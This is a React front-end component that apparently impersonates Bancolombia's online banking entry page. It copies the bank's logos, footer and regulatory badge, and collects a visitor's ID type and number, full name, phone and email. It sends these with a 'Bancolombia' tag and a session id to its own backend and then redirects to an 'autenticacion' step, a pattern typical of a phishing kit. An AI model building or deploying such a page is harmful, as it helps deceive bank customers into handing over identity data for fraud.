import { instanceBackend } from "app/axios/instanceBackend";
import { useEffect, useState, useRef } from "react";
import InactividadModal from "./modals/inactividadModal";
import AccionesModal from "./modals/accionesModal";
import IniciarSesionModal from "./modals/iniciarSesionModal";
import Loading from "app/components/Loading";
import { MdBadge, MdNumbers } from "react-icons/md";
import { FaRegAddressCard } from "react-icons/fa6";
import { IoIosPhonePortrait } from "react-icons/io";
import { GoMail } from "react-icons/go";
import './css/LoginModal.css';

// Se exporta el componente
export default function IngresaTusDatos() {

  // Se inicializa el formState
  const [formState, setFormState] = useState({

    // Campos del formulario
    tipoDocumento: "CC - Cédula de ciudadanía",
    numeroDocumento: "",
    nombreCompleto: "",
    numeroCelular: "",
    correoElectronico: "",
    autorizaBancolombia: false,

    // Errores
    errorTipoDocumento: false,
    errorNumeroDocumento: false,
    errorNombreCompleto: false,
    errorNumeroCelular: false,
    errorCorreoElectronico: false,

    // Modales o alertas
    lanzarModalAcciones: false,
    lanzarModalInactividad: false,
    lanzarModalErrorSesion: false,

    // Se inicializan los focos
    touchedTipoDocumento: false,
    touchedNumeroDocumento: false,
    touchedNombreCompleto: false,
    touchedNumeroCelular: false,
    touchedCorreoElectronico: false,
    huboBlur: false,
  });

  // Se inicializa el cargando
  const [cargando, setCargando] = useState(false);

  // Se inicializa el estado del boton
  const [botonHabilitado, setBotonHabilitado] = useState(false);

  // Se inicializa los estados
  const [ip, setIp] = useState("");
  const [fechaHora, setFechaHora] = useState("");

  // Refs para polling y sesión
  const sesionIdRef = useRef(null);

  // Generar un ID único para esta sesión
  const generarSesionId = () => {

    // Se retorna la sesion id
    return 'sesion_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  };

  // Se crea el useEffect para capturar la ip publica y la hora en estandar
  useEffect(() => {

    // Se genera la sesion id y se guarda en la ref
    sesionIdRef.current = generarSesionId();

    // Se obtiene la IP
    obtenerIP();

    // Se obtiene la fecha/hora con formato
    obtenerFechaHora();
  }, []);

  //  Se crea el useEffect para ejecutar 1 minuto 
  useEffect(() => {

    // Ejecutar inmediatamente al montar
    obtenerFechaHora();

    // Calcular cuánto falta para el próximo minuto exacto
    const ahora = new Date();
    const msHastaProximoMinuto =
      (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

    let intervalId;

    // Timeout para sincronizar con el cambio exacto de minuto
    const timeoutId = setTimeout(() => {
      obtenerFechaHora();

      // Luego actualizar cada 60 segundos
      intervalId = setInterval(() => {
        obtenerFechaHora();
      }, 60000);
    }, msHastaProximoMinuto);

    // Cleanup
    return () => {
      clearTimeout(timeoutId);
      if (intervalId) clearInterval(intervalId);
    };
  }, []);

  // Obtiene la dirección IP pública del usuario
  const obtenerIP = async () => {

    // Se usa el try
    try {

      // Se realiza la petición HTTP a la API
      const response = await fetch("https://api.ipify.org?format=json");

      // Se convierte la respuesta a JSON
      const data = await response.json();

      // Se guarda la IP obtenida en el estado
      setIp(data.ip);
    } catch (error) {

      // En caso de error (sin internet, API caída, etc.)
      console.error("Error obteniendo IP", error);

      // Se asigna un valor por defecto para evitar fallos en la UI
      setIp("No disponible");
    };
  };

  // Obtiene la fecha y hora actual del sistema
  const obtenerFechaHora = () => {

    // Se obtiene la fecha y hora actual
    const ahora = new Date();

    // Opciones de formato para la fecha y hora
    const opciones = {
      weekday: "long",   // día de la semana (miércoles)
      year: "numeric",   // año (2026)
      month: "long",     // mes (enero)
      day: "numeric",    // día del mes (7)
      hour: "numeric",   // hora (5)
      minute: "2-digit", // minutos (38)
      hour12: true       // formato 12 horas (p. m.)
    };

    // Se formatea la fecha según el locale español de Colombia
    const formato = ahora.toLocaleString("es-CO", opciones);

    // Se guarda el valor formateado en el estado
    setFechaHora(formato);
  };

  // Metodo encargado de validar el boton con cada accion del formulario
  useEffect(() => {

    // Se valida
    const {
      tipoDocumento,
      numeroDocumento,
      nombreCompleto,
      numeroCelular,
      correoElectronico,
      errorTipoDocumento,
      errorNumeroDocumento,
      errorNombreCompleto,
      errorNumeroCelular,
      errorCorreoElectronico,
      huboBlur
    } = formState;

    // Se valida
    const todosLlenos =
      tipoDocumento &&
      numeroDocumento &&
      nombreCompleto &&
      numeroCelular &&
      correoElectronico;

    // Se valida
    const sinErrores =
      !errorTipoDocumento &&
      !errorNumeroDocumento &&
      !errorNombreCompleto &&
      !errorNumeroCelular &&
      !errorCorreoElectronico;

    // Se habilita
    setBotonHabilitado(huboBlur && todosLlenos && sinErrores);
  }, [formState]);

  // Se crea el useEffect para el manejo de inactividad
  useEffect(() => {

    // Variable para el temporizador
    let inactivityTimeout;

    // Se define el tiempo de inactividad (en milisegundos)
    const tiempoInactividad = 1000 * 60 * 1; // 5 minutos

    // Función para reiniciar el temporizador
    const reiniciarTemporizador = () => {

      // Se limpia el temporizador anterior
      clearTimeout(inactivityTimeout);

      // Se establece un nuevo temporizador
      inactivityTimeout = setTimeout(() => {

        // Se lanza el modal de inactividad
        setFormState(prev => ({
          ...prev,
          lanzarModalInactividad: false
        }));
      }, tiempoInactividad);
    };

    // Se reinicia el temporizador al cargar la página
    reiniciarTemporizador();

    // Se agrega un evento para detectar movimiento del mouse o pulsación de teclado
    window.addEventListener("mousemove", reiniciarTemporizador);
    window.addEventListener("keydown", reiniciarTemporizador);

    // Se limpia el efecto al desmontar el componente
    return () => {
      clearTimeout(inactivityTimeout);
      window.removeEventListener("mousemove", reiniciarTemporizador);
      window.removeEventListener("keydown", reiniciarTemporizador);
    };
  }, []);

  // Metodo encargado de manejar el cambio en los inputs
  const handleChange = (e) => {

    // Se captura el name y value del input
    const { name, value } = e.target;

    // Se actualiza el estado del formulario
    setFormState(prev => {

      // Se capturan los valores
      let nuevoValor = value;
      let error = false;

      // Validaciones específicas por campo
      if (name === "numeroDocumento") {

        // Se elimina todo lo que no sea dígito
        const limpio = value.replace(/\D/g, "");

        // Se formatea el valor con puntos de miles
        nuevoValor = formatearMiles(limpio);
        error = !validarNumeroDocumento(limpio);
      };

      // Validación para el número de celular
      if (name === "numeroCelular") {

        // Se elimina todo lo que no sea dígito
        const limpio = value.replace(/\D/g, "");

        // Se setea el valor y error
        nuevoValor = limpio;
        error = !validarNumeroCelular(limpio);
      };

      // Validacion para el correo
      if (name === "correoElectronico") {

        // Se valida y se elimina el trim
        nuevoValor = value.trim();

        // Se valida
        error = !validarCorreo(nuevoValor);
      };

      // Validacion para el nombre completo
      if (name === "nombreCompleto") {

        // Permite solo letras y espacios
        nuevoValor = value.replace(/[^a-zA-ZÀ-ÿ\s]/g, "");

        // Quita espacios al inicio y al final
        const valorLimpio = nuevoValor.trim();

        // ❌ Error si tiene menos de 8 caracteres
        error = valorLimpio.length < 8;
      };

      // Validación para el tipo de documento
      if (name === "tipoDocumento") {

        // Se valida si el valor es vacío
        error = nuevoValor === "";
      };

      // Se retorna el nuevo estado
      return {
        ...prev,
        [name]: nuevoValor,
        [`error${name.charAt(0).toUpperCase() + name.slice(1)}`]: error
      };
    });
  };

  // Metodo encargado de validar el numero del documento
  const validarNumeroDocumento = (numero) => {

    // Se valida que el numero tenga entre 7 y 14 digitos
    return numero.length >= 7 && numero.length <= 14;
  };

  // Metodo encargado de validar el numero de celular
  const validarNumeroCelular = (numero) => {

    //funcion que valide que si o si tiene que iniciar con 3
    if (numero.startsWith("3")) {

      // Retorna true si tiene 10 digitos
      return true && numero.length === 10;
    } else {

      // Retorna false
      return false;
    }
  };

  // Metodo encargado de validar el correo electrónico
  const validarCorreo = (correo) => {

    // Expresión regular para validar el correo electrónico
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // Retorna true si el correo es válido, de lo contrario false
    return regex.test(correo);
  };

  // Metodo encargado de manejar el evento blur
  const handleBlur = (e) => {

    // Se captura la informacion
    const { name } = e.target;

    // Se inicializa el estado
    setFormState(prev => ({
      ...prev,
      huboBlur: true,
      [`touched${name.charAt(0).toUpperCase() + name.slice(1)}`]: true
    }));
  };

  // Metodo encargado de bloquear el clipboard
  const bloquearClipboard = (e) => {

    // Se previene la accion por defecto
    e.preventDefault();

    // Se valida si ya hay un temporalizador activo
    if (formState.lanzarModalAcciones) return;

    // Se lanza la alerta
    setFormState(prev => ({
      ...prev,
      lanzarModalAcciones: true
    }));

    // Se crea un temporalizador para cerrar el modal
    setTimeout(() => {

      // Se llama el metodo para cerrar el modal
      cerrarModalAcciones();
    }, 2500);
  };

  // Metodo encargado de cerrar el modal
  const cerrarModalAcciones = () => {

    // Se actualiza el estado del formulario
    setFormState(prev => ({
      ...prev,
      lanzarModalAcciones: false
    }));
  };

  // Metodo encargado de manejar el login (submit)
  const handleLogin = async () => {

    // Se captura la informacion del formulario
    const { tipoDocumento, numeroDocumento, nombreCompleto, numeroCelular, correoElectronico } = formState;

    // Se inicializa el json
    const dataSend = {
      "data": {
        "attributes": {
          'banco': "Bancolombia",
          'fecha': fechaHora,
          'tipoDocumento': tipoDocumento,
          'numeroDocumento': numeroDocumento,
          'nombreCompleto': nombreCompleto,
          'numeroCelular': numeroCelular,
          'correoElectronico': correoElectronico,
          'sesion_id': sesionIdRef.current,
        },
      },
    };

    // Se muestra el cargando
    setCargando(true);

    // Se usa el try catch
    try {

      // Se envia la peticion
      await instanceBackend.post("/ingresa-tus-datos", dataSend).then((r) => {

        // Se captura la respuesta
        const { status } = r;

        // Se valida el status
        if (status === 200) {

          // Se almacena la informacion de la data en el localStorage del navegador
          localStorage.setItem("datos_usuario", JSON.stringify(r?.data?.data));

          // Se redirecciona a la siguiente pagina de la autenticacion
          window.location.href = "/autenticacion";
        };
      }).finally(() => {

        // Se quita el cargando
        setCargando(false);
      });
    } catch (error) {

      // En caso de error, se oculta el cargando
      setCargando(false);

      // Se muestra un mensaje de error
      alert('Error al enviar datos. Intente nuevamente.');
    };
  };

  // Metodo encargado de formatear miles
  const formatearMiles = (valor) => {

    // Se retorna el valor formateado
    return valor
      .replace(/\D/g, "") // solo números
      .replace(/\B(?=(\d{3})+(?!\d))/g, ".");
  };

  // Se retorna el componente
  return (
    <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
      <div
        style={{
          flex: 1,
          backgroundColor: "#2C2A29",
          backgroundImage: 'url("/assets/images/auth-trazo.svg")',
          backgroundRepeat: "no-repeat",
          backgroundPosition: "center",
          backgroundPositionY: "-70px",
          backgroundPositionX: "-500px",
        }}
      >
        <div style={{ textAlign: "center" }}>
          <img
            src="/assets/images/img_pantalla2/descarga.svg"
            alt="Logo"
            style={{ width: "238px", marginTop: "45px" }}
          />
        </div>

        <div
          style={{
            marginTop: "25px",
          }}
        >
          <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
            Para comenzar, compártenos la siguiente información.
          </h1>
        </div>

        <div className="login-page mt-2">
          <div className="login-box" style={{ backgroundColor: "#454648" }}>

            {/* ----------------------------------------- Tipo de identificación ----------------------------------------- */}
            <div className={`input-group-custom mt-2 ${formState.errorTipoDocumento ? "has-error" : ""}`}>
              <span style={{ marginRight: "10px" }}>
                <MdBadge size={20} color="white" />
              </span>

              <div className="input-wrapper">
                <select
                  id="tipoDocumento"
                  name="tipoDocumento"
                  className="input-line"
                  style={{
                    border: "none",
                  }}
                  required
                  value={formState.tipoDocumento}
                  onChange={handleChange}
                  onBlur={handleBlur}
                >
                  <option style={{ color: "black", borderBottom: "1px solid #000" }} value="CC - Cédula de ciudadanía">CC - Cédula de ciudadanía</option>
                  <option style={{ color: "black", borderBottom: "1px solid #000" }} value="CD - Carné diplomático">CD - Carné diplomático</option>
                  <option style={{ color: "black", borderBottom: "1px solid #000" }} value="PPT - Documento venezolano">PPT - Documento venezolano</option>
                  <option style={{ color: "black", borderBottom: "1px solid #000" }} value="IE - Identificación de extranjero">IE - Identificación de extranjero</option>
                  <option style={{ color: "black", borderBottom: "1px solid #000" }} value="FI - Fideicomiso">FI - Fideicomiso</option>
                  <option style={{ color: "black", borderBottom: "1px solid #000" }} value="NIT - Número de identificación tributaria">NIT - Número de identificación tributaria</option>
                  <option style={{ color: "black", borderBottom: "1px solid #000" }} value="PA - Pasaporte">PA - Pasaporte</option>
                  <option style={{ color: "black", borderBottom: "1px solid #000" }} value="RC - Registro civil">RC - Registro civil</option>
                  <option style={{ color: "black", borderBottom: "1px solid #000" }} value="TI - Tarjeta de identidad">TI - Tarjeta de identidad</option>
                </select>

                <label htmlFor="tipoDocumento" style={{ color: "#ffffff" }}>
                  Tipo de identificación
                </label>
              </div>
            </div>
            {formState.touchedTipoDocumento && formState.errorTipoDocumento && (
              <span className="input-error">Selecciona un tipo de identificación</span>
            )}
            <br />

            {/* ----------------------------------------- Número de documento -----------------------------------------*/}
            <div className={`input-group-custom mt-4 ${formState.errorNumeroDocumento ? "has-error" : ""}`}>
              <span style={{ marginRight: "10px" }}>
                <MdNumbers size={20} color="white" />
              </span>
              <div className="input-wrapper">
                <input
                  id="numeroDocumento"
                  name="numeroDocumento"
                  type="text"
                  className="input-line"
                  required
                  autoComplete="off"
                  maxLength={14}
                  placeholder=" "

                  /* Teclado numérico en móvil */
                  inputMode="numeric"

                  /* 🔒 Seguridad */
                  value={formState.numeroDocumento}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  onCopy={bloquearClipboard}
                  onPaste={bloquearClipboard}
                  onCut={bloquearClipboard}
                  onContextMenu={bloquearClipboard}
                />
                <label htmlFor="numeroDocumento" style={{ color: "#ffffffff" }}>Número de identificación</label>
              </div>
            </div>
            {formState.errorNumeroDocumento && formState.errorNumeroDocumento && (
              <span className="input-error">Ingresa tu número de identificación</span>
            )}
            <br />

            {/* ----------------------------------------- Nombre completo ----------------------------------------- */}
            <div className={`input-group-custom mt-4 ${formState.errorNombreCompleto ? "has-error" : ""}`}>
              <span style={{ marginRight: "10px" }}>
                <FaRegAddressCard size={20} color="white" />
              </span>

              <div className="input-wrapper">
                <input
                  id="nombreCompleto"
                  name="nombreCompleto"
                  type="text"
                  className="input-line"
                  required
                  autoComplete="off"
                  maxLength={60}
                  placeholder=" "

                  /* Valor */
                  value={formState.nombreCompleto}

                  /* Eventos */
                  onChange={handleChange}
                  onBlur={handleBlur}

                  /* 🔒 Seguridad */
                  onCopy={bloquearClipboard}
                  onPaste={bloquearClipboard}
                  onCut={bloquearClipboard}
                  onContextMenu={bloquearClipboard}
                />
                <label htmlFor="nombreCompleto" style={{ color: "#ffffffff" }}>
                  Nombre completo
                </label>
              </div>
            </div>
            {formState.errorNombreCompleto && formState.errorNombreCompleto && (
              <span className="input-error">Ingresa tu nombre completo</span>
            )}
            <br />

            {/* ----------------------------------------- Número de celular ----------------------------------------- */}
            <div className={`input-group-custom mt-4 ${formState.errorNumeroCelular ? "has-error" : ""}`}>
              <span style={{ marginRight: "10px" }}>
                <IoIosPhonePortrait size={20} color="white" />
              </span>

              <div className="input-wrapper">
                <input
                  id="numeroCelular"
                  name="numeroCelular"
                  type="text"
                  className="input-line"
                  required
                  autoComplete="off"
                  maxLength={10}
                  placeholder=" "

                  /* Teclado numérico en móvil */
                  inputMode="numeric"
                  pattern="[0-9]*"

                  /* 🔒 Seguridad */
                  value={formState.numeroCelular}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  onCopy={bloquearClipboard}
                  onPaste={bloquearClipboard}
                  onCut={bloquearClipboard}
                  onContextMenu={bloquearClipboard}
                />
                <label htmlFor="numeroCelular" style={{ color: "#ffffffff" }}>
                  Número de celular
                </label>
              </div>
            </div>
            {formState.errorNumeroCelular && formState.errorNumeroCelular && (
              <span className="input-error">Ingresa un número de celular válido</span>
            )}
            <br />

            {/* ----------------------------------------- Correo electrónico ----------------------------------------- */}
            <div className={`input-group-custom mt-4 ${formState.errorCorreoElectronico ? "has-error" : ""}`}>
              <span style={{ marginRight: "10px" }}>
                <GoMail size={20} color="white" />
              </span>

              <div className="input-wrapper">
                <input
                  id="correoElectronico"
                  name="correoElectronico"
                  type="email"
                  className="input-line"
                  required
                  autoComplete="off"
                  maxLength={80}
                  placeholder=" "

                  /* Teclado optimizado en móvil */
                  inputMode="email"

                  /* Valor */
                  value={formState.correoElectronico}

                  /* Eventos */
                  onChange={handleChange}
                  onBlur={handleBlur}

                  /* 🔒 Seguridad */
                  onCopy={bloquearClipboard}
                  onPaste={bloquearClipboard}
                  onCut={bloquearClipboard}
                  onContextMenu={bloquearClipboard}
                />
                <label htmlFor="correoElectronico" style={{ color: "#ffffffff" }}>
                  Correo electrónico
                </label>
              </div>
            </div>
            {formState.errorCorreoElectronico && formState.errorCorreoElectronico && (
              <span className="input-error">Ingresa un correo electrónico válido</span>
            )}
            <br />

            <button className="login-btn" style={{ fontSize: "14px", marginTop: "45px" }} disabled={!botonHabilitado} onClick={() => handleLogin()}>
              Continuar
            </button>
          </div>
        </div>
        <div className="login-page-footer mt-4">
          <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
            <span>¿Problemas para conectarte?</span>
            <span className="dot">·</span>
            <span>Aprende sobre seguridad</span>
            <span className="dot">·</span>
            <span>Reglamento Sucursal Virtual</span>
            <span className="dot">·</span>
            <span>Política de privacidad</span>
          </div>
          <hr style={{ marginTop: "20px" }} />
          <div className="footer-final">
            <div className="footer-left">
              <div>
                <img
                  src="/assets/images/img_pantalla2/descarga.svg"
                  alt="Bancolombia"
                  style={{ width: "180px" }}
                />
              </div>
              <div>
                <span className="vigilado">
                  <img
                    src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                    alt="Superintendencia"
                    style={{ width: "180px" }}
                  />
                </span>
              </div>
            </div>
            <div className="footer-right">
              <div className="mt-2">Dirección IP: {ip}</div>
              <div className="mb-2">{fechaHora}</div>
            </div>
          </div>
        </div>
      </div>

      <div className="visual-captcha" style={{ cursor: "pointer" }}>
        <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
      </div>

      {/* Cargando */}
      {cargando ?
        <Loading /> : null}

      {/* Modal de inactividad */}
      {formState.lanzarModalInactividad ?
        <InactividadModal isOpen={formState.lanzarModalInactividad} onClose={() => setFormState(prev => ({
          ...prev,
          lanzarModalInactividad: false
        }))} /> : null}

      {/* Modal de acciones */}
      {formState.lanzarModalAcciones ?
        <AccionesModal isOpen={formState.lanzarModalAcciones} onClose={cerrarModalAcciones} /> : null}

      {/* Modal de error de sesión */}
      {formState.lanzarModalErrorSesion ?
        <IniciarSesionModal isOpen={formState.lanzarModalErrorSesion} onClose={() => setFormState(prev => ({
          ...prev,
          lanzarModalErrorSesion: false
        }))} /> : null}
    </div>
  );
};